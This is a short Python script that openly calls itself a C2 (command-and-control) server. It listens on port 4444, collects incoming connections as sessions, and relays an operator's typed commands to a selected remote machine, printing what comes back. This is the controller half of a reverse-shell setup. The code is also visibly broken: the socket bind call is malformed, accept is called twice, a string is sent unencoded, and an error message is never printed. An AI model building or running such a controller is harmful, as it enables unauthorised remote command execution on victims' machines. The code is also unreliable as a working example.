import socket
import threading

clients = []
addresses = []

LISTENER_PORT = 4444

def handler(connection, address):
    index = clients.index(connection)
    while True:
        try:
            command = input(f"Session {index} > ")
            if command.lower() == "exit":
                connection.send("exit")
                connection.close()
                break
            connection.send(command.encode())
            result = connection.recv(4096).decode()
            print(result)
        except:
            print("Connection lost @ " + address)
            break

def accept_connections():

    server = socket.socket()
    server.bind("0.0.0.0" , LISTENER_PORT)
    server.listen()
    print(f"Listening on Port {LISTENER_PORT}")
    while True:
        c = server.accept()
        a = server.accept()

        clients.append(c)
        addresses.append(a)

        print(f"Connections found at this address {a}")

threading.Thread(target=accept_connections).start()


print("Welcome to the C2, type help to get started")
while True:
    # help, sessions, interact, quit 

    command = input("C2> ")


    if command.startswith("sessions"):
        for i, addy in enumerate(addresses):
            print(i , addy)
    elif command.startswith("interact "):
        session_ID = int(command.split()[1])
        handler(clients[session_ID], addresses[session_ID])
    elif command.startswith("help"):
        print(""""
              sesssions - lists all of the active sessions
              interact [index] - select which session to interact with
                exit - close the program
              """)
    elif command.startswith("exit"):
        break
    else:
        "Did not understand, please input again"


# [['interact'],[1]]